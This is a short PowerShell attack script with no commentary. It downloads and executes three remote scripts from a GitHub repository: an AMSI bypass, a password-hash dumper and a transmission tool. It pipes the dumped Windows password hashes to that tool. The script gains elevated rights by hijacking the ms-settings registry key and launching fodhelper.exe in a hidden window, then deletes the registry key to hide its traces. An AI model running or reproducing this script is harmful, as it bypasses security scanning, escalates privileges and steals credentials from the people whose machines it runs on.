[String]$program = "powershell -windowstyle hidden IEX " + "(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mo-tec/HashExtractor/master/AMSI-Bypass.ps1');IEX " + "(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mo-tec/HashExtractor/master/Get-PassHashes.ps1');IEX " + "(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mo-tec/HashExtractor/master/Invoke-Transmission.ps1');Get-PassHashes | Out-String | Invoke-Transmission -ip localhost"
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $program -Force
Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
Start-Sleep 3
Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force